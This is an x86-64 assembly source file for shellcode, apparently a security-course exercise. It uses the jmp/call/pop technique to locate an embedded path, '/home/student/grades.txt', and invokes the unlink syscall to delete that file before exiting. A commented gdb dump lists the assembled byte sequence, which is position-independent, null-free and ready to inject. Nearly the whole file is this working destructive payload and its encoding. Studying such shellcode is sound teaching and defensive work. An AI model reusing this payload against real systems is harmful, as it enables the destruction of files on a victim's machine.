#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	24
#define ENVP	(STRLEN+1)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq	%rcx
	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
	movq	%rax,(ENVP)(%rcx)	/* set up null envp */

	movb	$SYS_unlink,%al		/* set up the syscall number */
	movq	%rcx,%rdi		/* syscall arg 1: string pathname */
	leaq	ENVP(%rcx),%rsi		/* syscall arg 2: envp */

	syscall				/* invoke syscall */

	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    $SYS_exit,%al		/* set up the syscall number */
	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
/*
0x5fa <main>:   0xeb
(gdb) 
0x5fb <main+1>: 0x20


(gdb) 
0x5fc <popladdr>:       0x59
(gdb) 
0x5fd <popladdr+1>:     0x48
(gdb) 
0x5fe <popladdr+2>:     0x31
(gdb) 
0x5ff <popladdr+3>:     0xc0
(gdb) 
0x600 <popladdr+4>:     0x88
(gdb) 
0x601 <popladdr+5>:     0x41
(gdb) 
0x602 <popladdr+6>:     0x18
(gdb) 
0x603 <popladdr+7>:     0x48
(gdb) 
0x604 <popladdr+8>:     0x89
(gdb) 
0x605 <popladdr+9>:     0x41
(gdb) 
0x606 <popladdr+10>:    0x19
(gdb) 
0x607 <popladdr+11>:    0xb0
(gdb) 
0x608 <popladdr+12>:    0x57
(gdb) 
0x609 <popladdr+13>:    0x48
(gdb) 
0x60a <popladdr+14>:    0x89
(gdb) 
0x60b <popladdr+15>:    0xcf
(gdb) 
0x60c <popladdr+16>:    0x48
(gdb) 
0x60d <popladdr+17>:    0x8d
(gdb) 
0x60e <popladdr+18>:    0x71
(gdb) 
0x60f <popladdr+19>:    0x19
(gdb) 
0x610 <popladdr+20>:    0x0f
(gdb) 
0x611 <popladdr+21>:    0x05
(gdb) 
0x612 <popladdr+22>:    0x48
(gdb) 
0x613 <popladdr+23>:    0x31
(gdb) 
0x614 <popladdr+24>:    0xc0
(gdb) 
0x615 <popladdr+25>:    0xb0
(gdb) 
0x616 <popladdr+26>:    0x3c
(gdb) 
0x617 <popladdr+27>:    0x48
(gdb) 
0x618 <popladdr+28>:    0x31
(gdb) 
0x619 <popladdr+29>:    0xff
(gdb) 
0x61a <popladdr+30>:    0x0f
(gdb) 
0x61b <popladdr+31>:    0x05



(gdb) 
0x61c <calladdr>:       0xe8
(gdb) 
0x61d <calladdr+1>:     0xdb
(gdb) 
0x61e <calladdr+2>:     0xff
(gdb) 
0x61f <calladdr+3>:     0xff
(gdb) 
0x620 <calladdr+4>:     0xff


(gdb) 
0x621 <calladdr+5>:     0x2f
(gdb) 
0x622 <calladdr+6>:     0x68
(gdb) 
0x623 <calladdr+7>:     0x6f
(gdb) 
0x624 <calladdr+8>:     0x6d
(gdb) 
0x625 <calladdr+9>:     0x65
(gdb) 
0x626 <calladdr+10>:    0x2f
(gdb) 
0x627 <calladdr+11>:    0x73
(gdb) 
0x628 <calladdr+12>:    0x74
(gdb) 
0x629 <calladdr+13>:    0x75
(gdb) 
0x62a <calladdr+14>:    0x64
(gdb) 
0x62b <calladdr+15>:    0x65
(gdb) 
0x62c <calladdr+16>:    0x6e
(gdb) 
0x62d <calladdr+17>:    0x74
(gdb) 
0x62e <calladdr+18>:    0x2f
(gdb) 
0x62f <calladdr+19>:    0x67
(gdb) 
0x630 <calladdr+20>:    0x72
(gdb) 
0x631 <calladdr+21>:    0x61
(gdb) 
0x632 <calladdr+22>:    0x64
(gdb) 
0x633 <calladdr+23>:    0x65
(gdb) 
0x634 <calladdr+24>:    0x73
(gdb) 
0x635 <calladdr+25>:    0x2e
(gdb) 
0x636 <calladdr+26>:    0x74
(gdb) 
0x637 <calladdr+27>:    0x78
(gdb) 
0x638 <calladdr+28>:    0x74
*/ 
